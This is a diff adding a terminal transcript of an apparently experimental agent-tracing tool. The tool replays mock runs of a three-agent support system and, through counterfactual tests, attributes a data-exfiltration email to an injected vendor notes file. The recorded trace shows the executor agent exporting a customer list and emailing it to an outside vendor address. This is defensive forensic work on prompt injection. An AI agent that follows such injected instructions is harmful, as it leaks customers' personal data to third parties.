@@ -1,0 +1,50 @@
+$ tracekit why demo --out ~/demo/why
+tracekit: tracekit why is experimental: it works and is tested, but may change (docs/support.md)
+== record: 8 runs of a 3-agent support system (seeded mock models, fake tools) -> ~/demo/why
+  demo-seed0: lookup_order, issue_refund, send_email, export_customers, send_email   <- exfiltration
+  demo-seed1: lookup_order, issue_refund, send_email, export_customers, send_email   <- exfiltration
+  demo-seed2: lookup_order, escalate
+  demo-seed3: lookup_order, issue_refund, send_email
+  demo-seed4: lookup_order, issue_refund, send_email
+  demo-seed5: lookup_order, issue_refund, send_email, export_customers, send_email   <- exfiltration
+  demo-seed6: lookup_order, issue_refund, send_email, export_customers, send_email   <- exfiltration
+  demo-seed7: lookup_order, issue_refund, send_email, export_customers, send_email   <- exfiltration
+
+== investigating demo-seed0
+  researcher lookup_order     {"order_id": 1042}
+  executor   issue_refund     {"amount": 89.0, "order_id": 1042}
+  executor   send_email       {"body": "Refund of $89.00 issued.", "to": "c.rao@example.com"}
+  executor   export_customers {}
+  executor   send_email       {"attach": "customers.csv", "to": "audit@vendor-compliance.example"}
+
+== verify: hash chain intact, 20 events
+
+== blast radius (observed edges): what did each untrusted input reach?
+  inbox:ticket-881         reached 4 actions: issue_refund, send_email, export_customers, send_email
+  vendor:portal/notes.md   reached 4 actions: issue_refund, send_email, export_customers, send_email
+  web:shipping_faq         reached 4 actions: issue_refund, send_email, export_customers, send_email
+  Every untrusted input reached the exfiltration email. Reach alone cannot say which one caused it.
+
+== counterfactual tests (n=40 paired replays each; tools served from tape)
+  remove input:vendor:portal/notes.md target tool=send_email,arg~vendor-compliance    P(with)=0.80 P(without)=0.00 effect=+0.80 [+0.63, +0.90] n=40  CAUSAL (primary)
+  remove input:web:shipping_faq       target tool=send_email,arg~vendor-compliance    P(with)=0.80 P(without)=0.80 effect=+0.00 [-0.18, +0.18] n=40  RULED-OUT
+  remove input:inbox:ticket-881       target tool=send_email,arg~vendor-compliance    P(with)=0.80 P(without)=0.80 effect=+0.00 [-0.18, +0.18] n=40  RULED-OUT
+  remove msg:researcher->planner      target tool=send_email,arg~vendor-compliance    P(with)=0.80 P(without)=0.00 effect=+0.80 [+0.63, +0.90] n=40  CAUSAL (primary)
+  remove input:kb:refund_policy.md    target tool=issue_refund                        P(with)=0.93 P(without)=0.00 effect=+0.93 [+0.77, +0.97] n=40  CAUSAL (primary)
+
+== decision-level test (re-call only the researcher's model call; no program re-run needed)
+  remove input:vendor:*               target decision#10 output~vendor-compliance     P(with)=0.75 P(without)=0.00 effect=+0.75 [+0.60, +0.86] n=40  CAUSAL
+
+== structure
+  critical path: task [run] -> summarize [researcher] -> researcher → planner [researcher] -> plan [planner] -> planner → executor [planner] -> execute [executor] -> issue_refund [executor]
+
+runs:   ~/demo/why
+report: ~/demo/why/report.html   (static; open in a browser)
+live:   tracekit view --why ~/demo/why --allow-program tracekit.why.demo:SYSTEM
+[exit 0]
+
+$ tracekit why report ~/demo/why -o ~/demo/why/report2.html
+tracekit: tracekit why is experimental: it works and is tested, but may change (docs/support.md)
+~/demo/why/report2.html
+[exit 0]
+
